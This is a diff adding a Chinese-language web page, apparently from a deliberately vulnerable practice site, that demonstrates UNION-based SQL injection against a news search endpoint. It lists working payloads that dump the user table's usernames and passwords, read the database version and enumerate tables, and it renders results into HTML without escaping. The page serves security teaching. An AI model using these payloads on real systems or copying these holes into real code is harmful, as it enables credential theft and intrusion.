@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SQL注入演示</title>
+    <link rel="stylesheet" href="css/cyberpunk.css">
+</head>
+<body>
+    <header>
+        <h1>SQL 注入演示</h1>
+        <p class="note">UNION联合查询注入 — 响应中回显完整SQL语句便于学习</p>
+    </header>
+    <nav>
+        <a href="index.html">首页</a>
+        <a href="vulns.html">漏洞中心</a>
+        <a href="search_demo.html">SQL注入</a>
+        <a href="messages.html">留言板</a>
+    </nav>
+    <div class="container">
+        <div class="tips">
+            <h3>常用注入Payload：</h3>
+            <code>' UNION SELECT 1,2,3,4,5,6--                          （基础联合查询）</code>
+            <code>' UNION SELECT id,username,password,email,role,status from user--  （获取用户表）</code>
+            <code>' UNION SELECT 1,@@version,3,4,5,6--                   （获取数据库版本）</code>
+            <code>%' AND 1=2 UNION SELECT 1,group_concat(table_name),3,4,5,6 from information_schema.tables where table_schema=database()--  （获取表名）</code>
+        </div>
+        <div class="section">
+            <h2>新闻搜索</h2>
+            <div class="form-group">
+                <label>搜索关键词 (keyword参数 — 注入点)：</label>
+                <input type="text" id="keywordInput" placeholder="输入搜索词或注入Payload" value="' UNION SELECT 1,2,3,4,5,6--">
+            </div>
+            <button class="btn search-btn">搜索</button>
+        </div>
+        <div class="section">
+            <h2>执行的SQL语句</h2>
+            <div class="sql-display" id="sqlDisplay">等待查询...</div>
+        </div>
+        <div class="section">
+            <h2>查询结果</h2>
+            <table>
+                <thead>
+                    <tr>
+                        <th>ID</th><th>标题</th><th>内容(前50字)</th><th>时间</th><th>图片</th><th>UID</th>
+                    </tr>
+                </thead>
+                <tbody id="resultBody">
+                    <tr><td colspan="6" style="color:#555;text-align:center;">等待查询...</td></tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+    <footer>版权所有 © 2024 新闻网站 | SQL注入演示</footer>
+
+    <script src="./js/jquery-3.7.1.min.js"></script>
+    <script src="./js/config.js"></script>
+<script src="./js/utils.js"></script>
+    <script>
+        $(function(){
+            $(".search-btn").click(function(){
+                var kw = $("#keywordInput").val();
+                if (!kw) { alert("请输入搜索关键词"); return; }
+                $.ajax({
+                    url: API_BASE + "/searchNews.php",
+                    type: "GET",
+                    data: { keyword: kw },
+                    dataType: "json",
+                    success: function(r){
+                        $("#sqlDisplay").text(r.msg);
+                        if (r.status == 200) {
+                            var html = "";
+                            for (var i = 0; i < r.data.length; i++) {
+                                var item = r.data[i];
+                                html += '<tr>' +
+                                    '<td>' + (item.id || '') + '</td>' +
+                                    '<td>' + (item.title || '').substring(0, 30) + '</td>' +
+                                    '<td>' + (item.context || '').substring(0, 50) + '</td>' +
+                                    '<td>' + (item.time || '') + '</td>' +
+                                    '<td>' + (item.newImg || '').substring(0, 30) + '</td>' +
+                                    '<td>' + (item.uid || '') + '</td>' +
+                                '</tr>';
+                            }
+                            $("#resultBody").html(html);
+                        } else {
+                            $("#resultBody").html('<tr><td colspan="6" style="color:#ff00ff;">' + r.msg + '</td></tr>');
+                        }
+                    },
+                    error: function(r){ console.log(r); }
+                });
+            });
+        });
+    </script>
+</html>
